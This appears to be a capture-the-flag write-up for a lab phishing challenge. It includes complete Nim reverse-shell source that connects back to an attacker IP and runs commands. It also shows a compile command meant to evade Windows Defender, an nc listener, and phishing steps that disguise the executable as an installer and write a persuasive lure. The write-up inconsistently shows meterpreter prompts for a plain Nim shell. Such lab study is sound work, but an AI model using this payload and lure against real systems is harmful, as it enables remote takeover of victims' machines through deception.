# Shadow Phishing 2

## Challenge Description
> ![image](https://github.com/user-attachments/assets/58ea1407-3af8-4c52-a498-b2a6e8c8859f)

## Solution
This challenge is similar to **Shadow Phishing**

To begin, we access the webmail interface at:
`http://10.10.201.221/`

Using the provided credentials:
`Username: shadowbyte@darknetmail.corp`
`Password: ShadowIsTheBest`

This grants us access to ShadowByte’s email account. Our objective is to craft and deliver a malicious Win10 x64 executable that can bypass the antivirus to our target, Cipher (cipher@darknetmail.corp).

![image](https://github.com/user-attachments/assets/d7895a59-cecd-4f3e-a345-08aaeb86ac1c)


A little of Googling suggest that we can bypass Windows Defender via NIM Reverse Shell.

![image](https://github.com/user-attachments/assets/1ccccd5b-2945-4b16-843a-9a35680c658f)

First we have to install MinGW 64 via sudo apt-install mingw-w64, and then git clone https://github.com/Sn1r/Nim-Reverse-Shell, and then install nim following the instructions `https://jonathanturnock.github.io/nim-tutorials/docs/linux-installation`

In the rev_shell.nim, we have to change the variables v1 and v2:
```
#[ 
   Created by Sn1r
   https://github.com/Sn1r/
 ]#

import net, os, osproc, strutils

proc exe(c: string): string =
  result = execProcess("cm" & "d /c " & c)

var
  v = newSocket()

  # Change this
  v1 = "10.21.148.139" //Attacker's IP
  v2 = "9000" // Listening Port

  s4 = "Exiting.."
  s5 = "cd"
  s6 = "C:\\"

try:
  v.connect(v1, Port(parseInt(v2)))

  while true:
    v.send(os.getCurrentDir() & "> ")
    let c = v.recvLine()
    if c == "exit":
      v.send(s4)
      break

    if c.strip() == s5:
      os.setCurrentDir(s6)
    elif c.strip().startswith(s5):
      let d = c.strip().split(' ')[1]
      try:
        os.setCurrentDir(d)
      except OSError as b:
        v.send(repr(b) & "\n")
        continue
    else:
      let r = exe(c)
      v.send(r)

except:
  raise
finally:
  v.close
```

> [!NOTE]  
> ### Steps to Generate the Malicious Windows Executable bypass Windows Defender
> 1. To create our payload, we use nim
>    
>    ```
>    nim c -d:mingw --app:gui rev_shell.nim
>    ```

![image](https://github.com/user-attachments/assets/dc0dda82-30e0-4249-8764-59b503f924e1)

To receive a connection when the target opens the malicious executable, we used rlwrap:
> [!NOTE]  
> ### Setting Up a Listener
> 1. Open a terminal and setup listener:
>    
>    ```
>    rlwrap nc -lvnp 9000
>    ```
  
Now, when the target opens the executable, we will receive a reverse shell.

The next step is to send the phishing email.
> [!NOTE]
> ### Sending the Phishing Email
> 1. Log into the webmail interface.
> 2. Compose a new email addressed to cipher@darknetmail.corp.
> 3. Attach the malicious executable (renaming it to something convincing like SilentEdgeInstaller.exe).
> 4. Write a persuasive message to encourage the recipient to open the document.
> 5. Send the email.

Once the target opens the document, our reverse shell should trigger within ~2 minutes.

After some time, we receive a reverse shell, confirming that Cipher has executed the payload:

![image](https://github.com/user-attachments/assets/cc0482e6-0e1f-4b96-ab7c-a146f8506776)

We navigated to the Administrator’s Desktop:
```
meterpreter > cd c:/users/Administrator/Desktop
meterpreter > ls
```
We retrieved the flag:
```
meterpreter > cat flag.txt
THM{3m41l_ph1sh1ng_1s_3z}
```

![image](https://github.com/user-attachments/assets/082f1e3d-75cf-4959-b3ac-d24c38994236)

## Conclusion
The challenge demonstrated the effectiveness of phishing attacks in compromising a target system. Crafting a convincing email is crucial for successful phishing attacks. 
The Metasploit framework provides robust modules for creating payloads and handling connections.

## Flag
THM{3m41l_ph1sh1ng_1s_3z}
